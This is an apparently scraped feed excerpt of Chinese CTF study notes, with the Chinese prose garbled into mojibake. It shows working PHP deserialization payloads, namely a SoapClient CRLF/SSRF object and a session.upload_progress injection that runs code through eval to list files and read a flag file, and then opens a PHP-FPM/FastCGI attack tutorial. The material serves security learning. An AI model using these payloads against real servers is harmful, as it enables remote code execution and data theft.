&lt;span style="color:#111">$b&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">SoapClient&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;location&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#111">$target&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#39;user_agent&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;AAA:BBB&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span> &lt;span style="color:#f92672">.&lt;/span>
&lt;span style="color:#d88200">&amp;#34;Cookie:PHPSESSID=gnnorfjmr9hr82gej7njt5dc83&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#39;uri&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;http://127.0.0.1/&amp;#34;&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;span style="color:#111">$se&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$b&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;|&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">urlencode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$se&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75715e">// O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A17%3A%22http%3A%2F%2F127.0.0.1%2F%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A52%3A%22AAA%3ABBB%0D%0ACookie%3APHPSESSID%3Dgnnorfjmr9hr82gej7njt5dc83%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>/?name=|O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A17%3A%22http%3A%2F%2F127.0.0.1%2F%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A52%3A%22AAA%3ABBB%0D%0ACookie%3APHPSESSID%3Dgnnorfjmr9hr82gej7njt5dc83%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D&amp;amp;f=session_start
Cookie: PHPSESSID=gnnorfjmr9hr82gej7njt5dc83
POST: serialize_handler=php_serialize
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>/?name=Soapclient&amp;amp;f=extract
Cookie: PHPSESSID=gnnorfjmr9hr82gej7njt5dc83
POST: b=call_user_func
&lt;/code>&lt;/pre>&lt;p>ä¹‹åŽåˆ·æ–°é¡µé¢å°±å¯ä»¥è§¦å‘ååºåˆ—åŒ–äº†ï¼Œç”±äºŽä¸Šé¢æž„é€ çš„æ—¶å€™cookieå°±æ˜¯å½“å‰é¡µé¢çš„cookieï¼Œæ‰€ä»¥æ•´ä¸€å¥—è¿‡ç¨‹ä¸‹æ¥ä¸éœ€è¦å•ç‹¬æ”¹sessionï¼Œé¦–é¡µå°±å¯ä»¥çœ‹åˆ°ç»“æžœ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211129123843040.png" alt="image-20211129123843040">&lt;/p>
&lt;h3 id="jarvisoj-webphpinfo">[Jarvisoj web]PHPINFO&lt;/h3>
&lt;p>&lt;a href="http://web.jarvisoj.com:32784/index.php">è¿™é‡Œæ˜¯é¢˜ç›®é¡µé¢&lt;/a>ï¼›å¼€å¹•æºç &lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#75715e">//A webshell is wait for you
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#75af00">ini_set&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;session.serialize_handler&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;php&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">session_start&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">OowoO&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$mdzz&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">mdzz&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;phpinfo();&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__destruct&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">eval&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">mdzz&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">isset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;phpinfo&amp;#39;&lt;/span>&lt;span style="color:#111">]))&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$m&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">OowoO&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">else&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">highlight_string&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">file_get_contents&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;index.php&amp;#39;&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å…ˆçœ‹çœ‹phpinfoï¼Œåº”è¯¥æœ‰æç¤ºä¿¡æ¯ï¼›å‘çŽ°&lt;code>session.upload_progress.enabled=On&lt;/code>ï¼Œè¿™å°±éžå¸¸å¥½äº†ï¼Œæž„é€ ä¸€ä¸ªä¸Šä¼ è¡¨å•æŠŠæˆ‘ä»¬æƒ³æ‰§è¡Œçš„ä»£ç åºåˆ—åŒ–åŽè®¾ä¸ºæ–‡ä»¶åä¼ å…¥&lt;/p>
&lt;p>åºåˆ—åŒ–exp&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#75af00">ini_set&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;session.serialize_handler&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;php_serialize&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">session_start&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">OowoO&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$mdzz&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;print_r(scandir(dirname(__FILE__)));&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">$obj&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">OowoO&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;|&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$obj&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75715e">// |O:5:&amp;#34;OowoO&amp;#34;:1:{s:4:&amp;#34;mdzz&amp;#34;;s:36:&amp;#34;print_r(scandir(dirname(__FILE__)));&amp;#34;;}
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>æž„é€ ä¸Šä¼ è¡¨å•ï¼Œæ³¨æ„æ–‡ä»¶åçš„å¼•å·è¦åŠ åæ–œæ è½¬ä¹‰&lt;/p>
&lt;pre tabindex="0">&lt;code>|O:5:\&amp;quot;OowoO\&amp;quot;:1:{s:4:\&amp;quot;mdzz\&amp;quot;;s:36:\&amp;quot;print_r(scandir(dirname(__FILE__)));\&amp;quot;;}
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211129212625924.png" alt="image-20211129212625924">&lt;/p>
&lt;p>ç„¶åŽè®¿é—®è¿™ä¸ªphp&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$mdzz&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;print_r(file_get_contents(&amp;#34;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php&amp;#34;));&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>|O:5:\&amp;quot;OowoO\&amp;quot;:1:{s:4:\&amp;quot;mdzz\&amp;quot;;s:88:\&amp;quot;print_r(file_get_contents(\&amp;quot;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php\&amp;quot;));\&amp;quot;;}
&lt;/code>&lt;/pre>&lt;p>å¾—åˆ°flag&lt;/p>
&lt;hr>
&lt;p>å‘¼â€¦â€¦é•¿èˆ’ä¸€å£æ°”ï¼Œè¿™ä¸ªçŸ¥è¯†ç‚¹ç»ˆäºŽç”»ä¸Šäº†ä¸€ä¸ªå°å¥å·ï¼›æš‘å‡æ€»ç»“phpååºåˆ—åŒ–çš„æ—¶å€™å°±å·®æ•´ä¸ªå’Œå†…ç½®ç±»ï¼Œç»“æžœç£¨ç£¨è¹­è¹­æ‹–åˆ°ä»Šå¤©ï¼Œä¸è¿‡è¿˜æ˜¯è¢«æˆ‘ç»ˆç»“æŽ‰å•¦ï¼æ–‡ä¸­è¿˜è®¾è®¡äº†ä¸€ç‚¹SoapClientå†…ç½®ç±»çš„ä¸œè¥¿ï¼Œç”±äºŽç¯‡å¹…åŽŸå› ä¸å±•å¼€è®²äº†= = ã€&lt;/p>
&lt;p>æœ€è¿‘çš„è®¡åˆ’å’Œå®‰æŽ’å°±æ˜¯åˆ·é¢˜&amp;amp;æŠŠä¹‹å‰çš„çŸ¥è¯†ä½“ç³»å¡«å……å®Œæ•´ï¼ŒåŠ æ²¹å•¦&lt;/p>
&lt;hr>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
ä»¥ä¸‹æ˜¯æœ¬æ–‡ä¸­æ¶‰åŠåˆ°çš„ å’Œæˆ‘å­¦ä¹ æ—¶çœ‹è¿‡çš„æ‰€æœ‰æ–‡ç« çš„é“¾æŽ¥ æ¯æ—¥æ„Ÿè°¢äº’è”ç½‘çš„ä¸°å¯Œèµ„æºï¼ˆ
&lt;/h4>
&lt;/summary>
&lt;p>&lt;a href="https://xz.aliyun.com/t/3339#toc-3">LCTF 2018 Writeup &amp;ndash; ROIS&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://www.jianshu.com/p/dfd049924258">LFI via SegmentFault&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://blog.spoock.com/2016/10/16/php-serialize-problem/">PHPä¸­SESSIONååºåˆ—åŒ–æœºåˆ¶&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://www.freebuf.com/news/202819.html">åˆ©ç”¨session.upload_progressè¿›è¡Œæ–‡ä»¶åŒ…å«å’Œååºåˆ—åŒ–æ¸—é€&lt;/a>&lt;/p>
&lt;p>å¦‚æœ‰é—æ¼è¯·æŒ‡æ­£ï¼ï¼ï¼&lt;/p>
&lt;/details></description></item><item><title>æ”»å‡»PHP-FPMå­¦ä¹ ç¬”è®°</title><link>https://amiaaaz.github.io/2021/11/18/attack-php-fpm-study-notes/</link><pubDate>Thu, 18 Nov 2021 00:03:25 +0800</pubDate><guid>https://amiaaaz.github.io/2021/11/18/attack-php-fpm-study-notes/</guid><description>&lt;p>ä¹‹å‰åšé¢˜æ€»æ˜¯ä¼šè§åˆ°ï¼Œä½†å¹¶ä¸æ˜¯å¾ˆæ‡‚å®žé™…çš„åŽŸç†ï¼Œæœ‰ç‚¹äº‘é‡Œé›¾é‡Œçš„ï¼Œå¥½åƒæ‡‚äº†ä½†åˆæ²¡æœ‰å®Œå…¨æ‡‚ï¼Œæ˜¯æ—¶å€™ä¸“é—¨æ¥å­¦ä¸€ä¸‹å’¯ï¼&lt;/p>
&lt;p>æ²¡æœ‰ä»€ä¹ˆæ–°é²œçš„ä¸œè¥¿ï¼Œåªä¸è¿‡æŠŠå¸ˆå‚…ä»¬å·²æœ‰çš„æ–‡ç« è¿›è¡Œä¸€ä¸ªæ•´åˆ&amp;amp;é‡æ–°æ•´ç†ï¼Œå‚è€ƒé“¾æŽ¥æ”¾åˆ°æœ€åŽå•¦w&lt;/p>
&lt;h2 id="å‰ç½®çŸ¥è¯†">å‰ç½®çŸ¥è¯†&lt;/h2>
&lt;h3 id="cgifastcgi">CGI/FastCGI&lt;/h3>
&lt;p>CGIåè®®ç”¨äºŽå¤„ç†htmlè¿™ç±»é™æ€æ–‡ä»¶ä¹‹åŽå‡ºçŽ°çš„åŠ¨æ€è¯­è¨€çš„è§£é‡Šå™¨ä¸Žwebserveré€šä¿¡çš„é—®é¢˜ï¼Œå…·ä½“çš„å®žçŽ°æœ‰php-cgi&lt;/p>
&lt;p>CGIçš„å¼Šç«¯æ˜¯ä»¤webserveræ¯æ¬¡å¤„ç†è¯·æ±‚æ—¶éƒ½ä¼šforkä¸€ä¸ªcgiè¿›ç¨‹ï¼Œç»“æŸåŽå†killï¼Œæ¯”è¾ƒæµªè´¹èµ„æºï¼ŒFastCGIåè®®å°±è§£å†³äº†è¿™ä¸ªé—®é¢˜ï¼Œå¤„ç†å®Œè¯·æ±‚åŽä¸ä¼škillè€Œæ˜¯ä¿ç•™è¯¥è¿›ç¨‹ï¼Œä½¿å®ƒå¯ä»¥ä¸€æ¬¡å¤„ç†å¤šä¸ªè¯·æ±‚ï¼Œè¿™æ ·å°±ä¸ç”¨æ¯æ¬¡forkäº†&lt;/p>
&lt;p>è€Œphp-fpmå°±æ˜¯FastCGIåè®®çš„ä¸€ä¸ªå…·ä½“å®žçŽ°ï¼Œä½œä¸ºFastCGIè¿›ç¨‹ç®¡ç†å™¨ï¼ˆè¿è¡Œæ—¶æœ‰ä¸€ä¸ªä¸»è¿›ç¨‹å’Œå¤šä¸ªåŒ…å«phpè§£é‡Šå™¨çš„workerè¿›ç¨‹æ¥æ‰§è¡Œä»£ç ï¼‰ï¼Œç”¨äºŽæŽ¥æ”¶webserverçš„è¯·æ±‚&lt;/p>
&lt;p>æŸ¥çœ‹phpinfoï¼ŒSever APIå¤„ä¸€èˆ¬ä¼šæœ‰ä¸‰ç§æ ·å¼ï¼š&lt;/p>
&lt;ul>
&lt;li>Apache 2.0 Handler&lt;/li>
&lt;li>CGI/FastCGI&lt;/li>
&lt;li>FPM/FastCGI&lt;/li>
&lt;/ul>
&lt;p>ç¬¬ä¸€ç§æŠŠphpä½œä¸ºapacheçš„ä¸€ä¸ªæ¨¡å—ï¼Œç›¸å½“äºŽapacheä¸­çš„ä¸€ä¸ª.dllæˆ–.soï¼›ç¬¬äºŒç§php-cgi.exeæ˜¯ä¸€ä¸ªç‹¬ç«‹çš„è¿›ç¨‹ï¼ŒwebæœåŠ¡å™¨ä¹Ÿæ˜¯ç‹¬ç«‹çš„apache.exeï¼ŒwebæœåŠ¡å™¨ç›‘å¬åˆ°httpè¯·æ±‚æ—¶ä¼šåŽ»è°ƒç”¨php-cgiè¿›ç¨‹ï¼Œä¹‹é—´é€šè¿‡cgiåè®®ä¼ é€’æ•°æ®ï¼›è€Œç¬¬ä¸‰ç§fastcgiä¹Ÿæ˜¯ä¸€ç§åè®®ï¼Œå®ƒåšäº†å¾ˆå¤šä¼˜åŒ–ä¸”å¸¸é©»å†…å­˜ ä¸ç”¨æ¯æ¬¡éƒ½è°ƒç”¨ä¸€ä¸‹cgiï¼Œæœ‰è¾…åŠ©åŠŸèƒ½æ¯”å¦‚å†…å­˜ç®¡ç†ï¼Œåžƒåœ¾å¤„ç†ç”±php-fpmæ¥å®žçŽ°&lt;/p>
&lt;h3 id="é…ç½®">é…ç½®&lt;/h3>
&lt;p>php-fpmé€šä¿¡æ–¹å¼æœ‰tcpï¼ˆæœ¬åœ°ç›‘å¬9000ç«¯å£ï¼‰å’Œunix socketå¥—æŽ¥å­—ä¸¤ç§æ–¹å¼ï¼Œé¢˜ç›®ä¸­å¯ä»¥è§åˆ°çš„éƒ½æ˜¯tcp9000&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">apt update
apt install nginx -y
apt install software-properties-common -y
apt install php7.4-fpm -y
&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="tcpæ¨¡å¼">tcpæ¨¡å¼&lt;/h4>
&lt;p>/etc/php/7.4/fpm/pool.d/www.conf&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-ini" data-lang="ini">&lt;span style="color:#75af00">listen&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">127.0.0.1:9000&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>/etc/nginx/sites-enabled/default&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-ini" data-lang="ini">&lt;span style="color:#75af00">server{&lt;/span>
&lt;span style="color:#75af00">...&lt;/span>
&lt;span style="color:#75af00">location ~ \.php$ {&lt;/span>
&lt;span style="color:#75af00">include snippets/fastcgi-php.conf;&lt;/span>
&lt;span style="color:#75af00">fastcgi_pass 127.0.0.1:9000;&lt;/span>
&lt;span style="color:#75af00">}&lt;/span>
&lt;span style="color:#75af00">...&lt;/span>
&lt;span style="color:#75af00">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="unix-socketæ¨¡å¼">unix socketæ¨¡å¼&lt;/h4>
&lt;p>å¦‚æžœå¯åŠ¨fpmä¸åšæ”¹åŠ¨ï¼Œé»˜è®¤ä¸ºå¥—æŽ¥å­—æ¨¡å¼&lt;/p>
&lt;p>/etc/php/7.4/fpm/pool.d/www.conf&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-ini" data-lang="ini">&lt;span style="color:#75af00">listen&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">/run/php/php7.4-fpm.sock&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>/etc/nginx/sites-enabled/default&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-ini" data-lang="ini">&lt;span style="color:#75af00">server{&lt;/span>
&lt;span style="color:#75af00">...&lt;/span>
&lt;span style="color:#75af00">location ~ \.php$ {&lt;/span>
&lt;span style="color:#75af00">include snippets/fastcgi-php.conf;&lt;/span>
&lt;span style="color:#75af00">fastcgi_pass unix:/run/php/php7.4-fpm.sock;&lt;/span>
&lt;span style="color:#75af00">}&lt;/span>
&lt;span style="color:#75af00">...&lt;/span>
&lt;span style="color:#75af00">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ç„¶åŽé‡å¯å³å¯&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">service nginx start &lt;span style="color:#75715e"># reload&lt;/span>
/etc/init.d/php7.4-fpm start &lt;span style="color:#75715e"># restart&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>å¦‚æžœå‡ºçŽ°æŠ¥é”™è¯·æŸ¥çœ‹å¯¹åº”æ—¥å¿—&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">cat /var/log/nginx/error.log
cat /var/log/php7.4-fpm.log
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="æ¼æ´žæˆå› ">æ¼æ´žæˆå› &lt;/h2>
&lt;p>æŒ‰FastCGIåè®®ä¼ è¾“çš„å†…å®¹åˆ†ä¸ºheaderå’Œbodyä¸¤éƒ¨åˆ†&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#00a8c8">typedef&lt;/span> &lt;span style="color:#00a8c8">struct&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75715e">/* Header */&lt;/span>
&lt;span style="color:#00a8c8">unsigned&lt;/span> &lt;span style="color:#00a8c8">char&lt;/span> &lt;span style="color:#111">version&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// ç‰ˆæœ¬
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">unsigned&lt;/span> &lt;span style="color:#00a8c8">char&lt;/span> &lt;span style="color:#111">type&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// æœ¬æ¬¡recordçš„ç±»åž‹
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">unsigned&lt;/span> &lt;span style="color:#00a8c8">char&lt;/span> &lt;span style="color:#111">requestIdB1&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// æœ¬æ¬¡recordå¯¹åº”çš„è¯·æ±‚id
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">unsigned&lt;/span> &lt;span style="color:#00a8c8">char&lt;/span> &lt;span style="color:#111">requestIdB0&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">unsigned&lt;/span> &lt;span style="color:#00a8c8">char&lt;/span> &lt;span style="color:#111">contentLengthB1&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// bodyä½“çš„å¤§å°
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">unsigned&lt;/span> &lt;span style="color:#00a8c8">char&lt;/span> &lt;span style="color:#111">contentLengthB0&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">unsigned&lt;/span> &lt;span style="color:#00a8c8">char&lt;/span> &lt;span style="color:#111">paddingLength&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// é¢å¤–å—å¤§å°
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">unsigned&lt;/span> &lt;span style="color:#00a8c8">char&lt;/span> &lt;span style="color:#111">reserved&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#75715e">/* Body */&lt;/span>
&lt;span style="color:#00a8c8">unsigned&lt;/span> &lt;span style="color:#00a8c8">char&lt;/span> &lt;span style="color:#111">contentData&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">contentLength&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#00a8c8">unsigned&lt;/span> &lt;span style="color:#00a8c8">char&lt;/span> &lt;span style="color:#111">paddingData&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">paddingLength&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#111">FCGI_Record&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>å…ˆä»Žhederä¸­æ‹¿åˆ°bodyä½“å¤§å°ï¼ˆæœ€å¤§2^16=65535å­—èŠ‚ï¼‰ï¼Œå†ä»Žtcpæµé‡Œè¯»å–å¤§å°ç­‰äºŽcontentLenthçš„bodyï¼Œä¹‹åŽè¿˜æœ‰ä¸€éƒ¨åˆ†é¢å¤–çš„padding&lt;/p>
&lt;p>headerä¸­çš„typeèµ·åˆ°æŒ‡å®šrecordçš„ä½œç”¨ï¼Œå› ä¸ºFastCGIçš„å•ä¸ªrecordå¤§å°æœ‰é™ä½œç”¨å•ä¸€ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ä¸€ä¸ªTCPæµä¸­ä¼ è¾“å¤šä¸ªrecordï¼Œé€šè¿‡typeæ¥æ ‡è¯†æ¯ä¸ªrecordçš„ä½œç”¨æ˜¯ä»€ä¹ˆï¼ŒrequestIdåšåˆ°åŒºåˆ†æ¯ä¸€æ¬¡çš„è¯·æ±‚&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112110643128.png" alt="image-20211112110643128">&lt;/p>
&lt;p>å½“type=4æ—¶ï¼Œè¡¨æ˜Žæ¶ˆæ¯ä¸­åŒ…å«çš„æ•°æ®ä¸ºæŸä¸ªname-valueå¯¹ï¼Œæ¯”å¦‚&lt;/p>
&lt;pre tabindex="0">&lt;code>{
'GATEWAY_INTERFACE': 'FastCGI/1.0',
'REQUEST_METHOD': 'GET',
'SCRIPT_FILENAME': '/var/www/html/index.php',
'SCRIPT_NAME': '/index.php',
'QUERY_STRING': '?a=1&amp;amp;b=2',
'REQUEST_URI': '/index.php?a=1&amp;amp;b=2',
'DOCUMENT_ROOT': '/var/www/html',
'SERVER_SOFTWARE': 'php/fcgiclient',
'REMOTE_ADDR': '127.0.0.1',
'REMOTE_PORT': '12345',
'SERVER_ADDR': '127.0.0.1',
'SERVER_PORT': '80',
'SERVER_NAME': &amp;quot;localhost&amp;quot;,
'SERVER_PROTOCOL': 'HTTP/1.1'
}
